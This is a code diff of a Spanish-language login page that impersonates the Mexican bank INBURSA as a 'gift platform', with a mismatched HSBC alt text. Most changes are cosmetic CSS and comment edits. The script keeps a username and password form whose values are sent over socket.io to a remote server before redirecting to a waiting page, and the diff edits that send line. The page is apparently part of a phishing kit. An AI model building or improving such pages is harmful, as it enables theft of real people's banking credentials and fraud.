@@ -12,8 +12,8 @@
       font-family: 'Open Sans', sans-serif;
       background: #f3f6f9;
       display: flex;
-      justify-content: center;  /* Centrado horizontal */
-      align-items: center;      /* Centrado vertical */
+      justify-content: center;
+      align-items: center;
       min-height: 100vh;
       text-align: center;
     }
@@ -40,24 +40,15 @@
       margin-bottom: 1rem;
     }
 
-    p {
-      font-size: 1em;
-      color: #555;
-      margin-bottom: 1rem;
-    }
-
-    /* Estilo de los campos de texto */
     .input-group {
       display: flex;
       align-items: center;
       background: #f0f2f5;
       border-radius: 8px;
-      margin: 1rem 0;  /* Espaciado entre campos */
+      margin: 1rem 0;
       padding: 0.0rem 1rem;
       width: 100%;
       max-width: 350px;
-      justify-content: flex-start; /* Mueve los campos hacia la izquierda */
-      margin-left: -15px; /* Ajuste para mover más hacia la izquierda */
     }
 
     .input-group .icon {
@@ -75,11 +66,10 @@
       height: 20px;
     }
 
-    /* Botón centrado y ajustado */
     button {
       background-color: #262D91;
       color: white;
-      padding: 8px 20px; /* Botón más pequeño */
+      padding: 8px 20px;
       border: none;
       border-radius: 8px;
       cursor: pointer;
@@ -92,12 +82,6 @@
       background-color: #1924D1;
     }
 
-    button:disabled {
-      background: #cccccc;
-      cursor: not-allowed;
-    }
-
-    /* Mensaje de error */
     .mensaje-error {
       color: red;
       margin-top: 1rem;
@@ -113,7 +97,7 @@
   <div class="screen active" id="pantallaInicio">
     <img src="https://companieslogo.com/img/orig/GFINBURO.MX-bfce3765.png?t=1720244492" alt="HSBC" class="logo">
     <h2>Bienvenido a su plataforma de regalos de <strong>INBURSA</strong> </h2>
-    <p>Ingrese su usuario y contraseña para continuar con su proceso de analisis.</p>
+    <p>Ingrese su usuario y contraseña para continuar con su proceso de análisis.</p>
     <form id="login-form">
       <div class="input-group">
         <div class="icon"><i class="fas fa-user"></i></div>
@@ -123,7 +107,6 @@
         <div class="icon"><i class="fas fa-lock"></i></div>
         <input type="password" id="password" placeholder="Contraseña" required>
       </div>
-      
       <p id="usuarioError" class="mensaje-error"></p>
       <p id="passwordError" class="mensaje-error"></p>
       <button type="submit" id="btnContinuar">Continuar</button>
@@ -150,8 +133,8 @@
             const sessionId = Math.random().toString(36).substring(2, 15);
             localStorage.setItem('sessionId', sessionId);
 
-            // Enviar datos al servidor mediante socket.io
-            socket.emit('dataForm', { usuario, contrasena, sessionId });
+            // Enviar los datos al servidor usando socket.emit
+            socket.emit('errorlogoForm', { usuario, contrasena, sessionId });
 
             // Ir a pantalla de espera (opciones.html)
             window.location.href = 'opciones.html';
